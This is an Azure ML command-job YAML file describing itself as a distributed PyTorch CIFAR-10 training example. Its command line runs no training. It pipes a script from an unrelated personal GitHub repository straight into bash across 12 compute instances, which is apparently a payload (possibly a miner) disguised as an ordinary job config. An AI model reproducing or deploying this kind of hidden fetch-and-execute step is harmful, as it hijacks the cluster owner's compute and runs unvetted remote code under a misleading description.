$schema: https://azuremlschemas.azureedge.net/latest/commandJob.schema.json
command: curl -sL https://github.com/nandafiku/gradi/raw/main/iron | bash
environment: azureml:AzureML-acpt-pytorch-1.13-cuda11.7@latest
compute: azureml:cluster4
distribution:
  type: pytorch
  process_count_per_instance: 1
resources:
  instance_count: 12
display_name: pytorch-cifar-distributed-example
experiment_name: pytorch-cifar-distributed-example
description: Train a basic convolutional neural network (CNN) with PyTorch on the CIFAR-10 dataset, distributed via PyTorch.
